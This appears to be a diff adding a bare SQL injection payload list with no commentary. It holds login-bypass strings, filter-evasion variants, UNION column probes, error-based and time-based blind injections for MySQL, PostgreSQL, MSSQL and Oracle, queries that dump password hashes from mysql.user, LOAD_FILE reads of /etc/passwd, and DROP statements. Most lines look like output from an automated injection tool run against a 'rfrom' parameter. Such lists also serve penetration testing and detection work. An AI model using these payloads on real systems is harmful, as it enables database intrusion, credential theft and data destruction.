@@ -1,0 +1,1980 @@
+select * from user_pwd where name='1' and EXP(~(SELECT*FROM(SELECT USER())a));
+' or 1=1#
+'=0#
+'>-1#
+'<1#
+1'<99#
+'=0=1#
+'<=>0#
+'=0=1=1=1=1=1#
+'=1<>1#
+'<>1#
+1'<>99999#
+'!=2!=3!=4#
+'|0#
+'&0#
+'^0#
+'<<0#
+'>>0#
+'&''#
+'%11&1#
+'&1&1#
+'|0&1#
+'<<0|0#
+'<<0>>0#
+'*9#
+'/9#
+'%9#
+'+0#
+'-0#
+'+2+5-7#
+'+0+0-0#
+'-0-0-0-0-0#
+'*9*8*7*6*5#
+'/2/3/4#
+'%12%34%56%78#
+'/**/+/**/0#
+'-----0#
+'+++0+++++0*0#
+'<hex(1)#
+'=left(0x30,1)#
+'=right(0,1)#
+'!=curdate()#
+'-reverse(0)#
+'=ltrim(0)#
+'<abs(1)#
+'*round(1,1)#
+'&left(0,0)#
+'*round(0,1)*round(0,1)#
+'=upper     (0)#
+' <1 and 1#
+'xor 1#
+'div 1#
+'is not null#
+admin' order by'
+admin' group by'
+'like 0#
+'between 1 and 1#
+'regexp 1#
+'='
+'<>'1
+'>1='
+'>1='
+0'='0
+0'='0
+'<1 and 1>'
+'<1 and 1>'
+'<>ifnull(1,2)='1
+'<>ifnull(1,2)='1
+'=round(0,1)='1
+'=round(0,1)='1
+'*0*'
+'*0*'
+'+'
+'+'
+'-'
+'-'
+'+1-1-'
+'+1-1-'
+'+(0-0)#
+'=0<>((reverse(1))-(reverse(1)))#
+'<(8*7)*(6*5)*(4*3)#
+'&(1+1)-2#
+'>(0-100)#
+'union select 1,load_file(0x2f6574632f706173737764),3 from users#
+'union select 1,group_concat(password),3 from users#
+admin' and (select count(*) from users)=3#
+?num=1 and 1=0
+?num=1 and 1=1
+?num=1=0
+?num=1=1
+?num=1<>0
+?num=1<>1
+?num=1<0
+?num=1<1
+?num=1*0*0*1
+?num=1*0*0*0
+?num=1%1%1%0
+?num=1%1%1%1
+?num=1 div 0
+?num=1 div 1
+?num=1 regexp 0
+?num=1 regexp 1
+?num=1^0
+?num=1^1
+?num=0^(locate(0x61,(select id from users where num=1),1)=1)
+?num=0^(select position(0x61 in (select id from users where num=1))=1)
+?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)
+?num=0^(lcase((select id from users where num=1))=0x61646d696e)
+?num=0^((select id from users where num=1)=0x61646d696e)
+?num=0^(id regexp 0x61646d696e)
+SELECT /*COMMENT*/ 1
+SELECT user()
+SELECT system_user()
+SELECT user FROM mysql.user
+SELECT host, user, password FROM mysql.user
+SELECT schema_name FROM information_schema.schemata; (MySQL >= 5.0)
+SELECT distinct(db) FROM mysql.db (need priv)
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+SLEEP(5)-- 
+SELECT BENCHMARK(1000000,MD5('A'));
+id=1 OR SLEEP(25)=0 LIMIT 1-- 
+id=1) OR SLEEP(25)=0 LIMIT 1-- 
+id=1' OR SLEEP(25)=0 LIMIT 1-- 
+id=1') OR SLEEP(25)=0 LIMIT 1-- 
+id=1)) OR SLEEP(25)=0 LIMIT 1-- 
+id=SELECT SLEEP(25)-- 
+?id=4
+?id=5-1
+?id=4 OR 1=1
+?id=-1 OR 17-7=10
+DROP sampletable;--
+DROP sampletable;#
+admin' or '1'='1'-- 
+DROP/**/sampletable;
+DR/**/OP/**/sampletable;
+SELECT IF(1=1, 1, 2)
+SELECT IF(user()='root@localhost','true','false')
+SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+SELECT * FROM 'user' WHERE 1 LIMIT 0,30
+SELECT * FROM mysql.user WHERE 1 LIMIT 1,1
+SELECT * FROM mysql.user
+SELECT user, password FROM mysql.user
+SELECT user, password FROM mysql.user LIMIT 1,1
+SELECT password FROM mysql.user WHERE user = 'root'
+SELECT schema_name FROM information_schema.schemata;
+SELECT schema_name FROM information_schema.schemata LIMIT 1,1;
+SELECT Super_priv FROM mysql.user WHERE user=(SELECT user) LIMIT 1,1--
+SELECT Super_priv FROM mysql.user WHERE user= �root� LIMIT 1,1--
+SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers�
+tblUsers -> tablename
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
+find table which have a column called 'username'
+?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1--
+id=1/*!uNIon*/SeLeCt+1,2,3-- 
+id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+1 || (select user from users where user_id = 1) = 'admin'
+1 || substr(user,1,1) = lower(conv(11,10,36))
+1 || substr(user,1,1) = unhex(61)
+1 || substr(user,1,1) = lower(conv(10,10,36
+1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1)) > 97, BENCHMARK(5000000,SHA1(1)),1))))),1);
+/?rfrom=soso&gDUe=4628 AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd
+/?rfrom=soso',.,".).),
+/?rfrom=soso'YoohMr<'">auvHiv
+/?rfrom=soso) AND 9245=5192 AND (5849=5849
+/?rfrom=soso) AND 8874=8874 AND (4780=4780
+/?rfrom=soso AND 1903=8599
+/?rfrom=soso AND 8874=8874
+/?rfrom=soso') AND 4105=2283 AND ('rDuI'='rDuI
+/?rfrom=soso') AND 8874=8874 AND ('pmUg'='pmUg
+/?rfrom=soso' AND 8351=8598 AND 'qAvb'='qAvb
+/?rfrom=soso' AND 8874=8874 AND 'Ciyp'='Ciyp
+/?rfrom=soso%' AND 4396=3099 AND '%'='
+/?rfrom=soso%' AND 8874=8874 AND '%'='
+/?rfrom=soso AND 4113=3651-- ANzy
+/?rfrom=soso AND 8874=8874-- QmQD
+/?rfrom=soso AND 8874=8874-- QmQD
+/?rfrom=(SELECT (CASE WHEN (1529=9212) THEN 1529 ELSE 1529*(SELECT 1529 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+/?rfrom=(SELECT (CASE WHEN (2454=2454) THEN 2454 ELSE 2454*(SELECT 2454 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+/?rfrom=soso) AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (4565=4565
+/?rfrom=soso AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/?rfrom=soso') AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('hOfW'='hOfW
+/?rfrom=soso' AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'gnof'='gnof
+/?rfrom=soso%' AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/?rfrom=soso AND (SELECT 2048 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(2048=2048,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- aaNk
+/?rfrom=soso) AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND (4637=4637
+/?rfrom=soso AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)
+/?rfrom=soso') AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND ('HMwR'='HMwR
+/?rfrom=soso' AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND 'MfwY'='MfwY
+/?rfrom=soso%' AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='
+/?rfrom=soso AND 3336=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3336=3336) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)) AS NUMERIC)-- nEFY
+/?rfrom=soso) AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))) AND (3250=3250
+/?rfrom=soso AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113)))
+/?rfrom=soso') AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))) AND ('dIHQ'='dIHQ
+/?rfrom=soso' AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))) AND 'TnPc'='TnPc
+/?rfrom=soso%' AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))) AND '%'='
+/?rfrom=soso AND 1597=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1597=1597) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113)))-- SyWP
+/?rfrom=soso) AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (5842=5842
+/?rfrom=soso AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)
+/?rfrom=soso') AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('ioBf'='ioBf
+/?rfrom=soso' AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'SkvV'='SkvV
+/?rfrom=soso%' AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
+/?rfrom=soso AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- aXtq
+/?rfrom=soso AND 6403=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6403=6403) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- aXtq
+/?rfrom=(SELECT 1713 FROM(SELECT COUNT(*),CONCAT(0x716b767871,(SELECT (ELT(1713=1713,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/?rfrom=(SELECT CONCAT(0x716b767871,(SELECT (ELT(6884=6884,1))),0x717a766a71))
+/?rfrom=(SELECT (CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (6280=6280) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)))
+/?rfrom=(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3830=3830) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))
+/?rfrom=soso);(SELECT * FROM (SELECT(SLEEP(5)))jvoW)#
+/?rfrom=soso;(SELECT * FROM (SELECT(SLEEP(5)))jvoW)#
+/?rfrom=soso');(SELECT * FROM (SELECT(SLEEP(5)))jvoW)#
+/?rfrom=soso';(SELECT * FROM (SELECT(SLEEP(5)))jvoW)#
+/?rfrom=soso%';(SELECT * FROM (SELECT(SLEEP(5)))jvoW)#
+/?rfrom=soso);SELECT PG_SLEEP(5)--
+/?rfrom=soso;SELECT PG_SLEEP(5)--
+/?rfrom=soso');SELECT PG_SLEEP(5)--
+/?rfrom=soso');SELECT PG_SLEEP(5)--
+/?rfrom=soso';SELECT PG_SLEEP(5)--
+/?rfrom=soso%';SELECT PG_SLEEP(5)--
+/?rfrom=soso);WAITFOR DELAY '0:0:5'--
+/?rfrom=soso;WAITFOR DELAY '0:0:5'--
+/?rfrom=soso');WAITFOR DELAY '0:0:5'--
+/?rfrom=soso';WAITFOR DELAY '0:0:5'--
+/?rfrom=soso%';WAITFOR DELAY '0:0:5'--
+/?rfrom=soso);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(105)||CHR(82)||CHR(114),5) FROM DUAL--
+/?rfrom=soso) AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG) AND (8069=8069
+/?rfrom=soso AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG)
+/?rfrom=soso') AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG) AND ('XrEc'='XrEc
+/?rfrom=soso' AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG) AND 'zTlB'='zTlB
+/?rfrom=soso%' AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG) AND '%'='
+/?rfrom=soso AND (SELECT * FROM (SELECT(SLEEP(5)))ChPG)-- Jbme
+/?rfrom=soso) AND 1618=(SELECT 1618 FROM PG_SLEEP(5)) AND (8973=8973
+/?rfrom=soso AND 1618=(SELECT 1618 FROM PG_SLEEP(5))
+/?rfrom=soso') AND 1618=(SELECT 1618 FROM PG_SLEEP(5)) AND ('QSnQ'='QSnQ
+/?rfrom=soso' AND 1618=(SELECT 1618 FROM PG_SLEEP(5)) AND 'VvJS'='VvJS
+/?rfrom=soso%' AND 1618=(SELECT 1618 FROM PG_SLEEP(5)) AND '%'='
+/?rfrom=soso AND 1618=(SELECT 1618 FROM PG_SLEEP(5))-- KaYO
+/?rfrom=soso) WAITFOR DELAY '0:0:5' AND (4703=4703
+/?rfrom=soso WAITFOR DELAY '0:0:5'
+/?rfrom=soso') WAITFOR DELAY '0:0:5' AND ('aszJ'='aszJ
+/?rfrom=soso' WAITFOR DELAY '0:0:5' AND 'LhBc'='LhBc
+/?rfrom=soso%' WAITFOR DELAY '0:0:5' AND '%'='
+/?rfrom=soso WAITFOR DELAY '0:0:5'-- OVGJ
+/?rfrom=soso) AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5) AND (1862=1862
+/?rfrom=soso AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5)
+/?rfrom=soso') AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5) AND ('ZtfN'='ZtfN
+/?rfrom=soso' AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5) AND 'HBuE'='HBuE
+/?rfrom=soso%' AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5) AND '%'='
+/?rfrom=soso AND 8800=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(110)||CHR(73)||CHR(80),5)-- DjnZ
+/?rfrom=soso) ORDER BY 1-- -
+/?rfrom=soso) UNION ALL SELECT NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso ORDER BY 1-- -
+/?rfrom=soso UNION ALL SELECT NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') ORDER BY 1-- -
+/?rfrom=soso') UNION ALL SELECT NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' ORDER BY 1-- -
+/?rfrom=soso' UNION ALL SELECT NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' ORDER BY 1-- -
+/?rfrom=soso%' UNION ALL SELECT NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso ORDER BY 1-- -
+/?rfrom=soso UNION ALL SELECT NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/?rfrom=soso) ORDER BY 1#
+/?rfrom=soso) UNION ALL SELECT NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso ORDER BY 1#
+/?rfrom=soso ORDER BY 1#
+/?rfrom=soso UNION ALL SELECT NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') ORDER BY 1#
+/?rfrom=soso') UNION ALL SELECT NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/?rfrom=soso' ORDER BY 1#
+/?rfrom=soso' UNION ALL SELECT NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL#
+/?rfrom=soso' UNION ALL SELECT NULL,NULL,NULL#
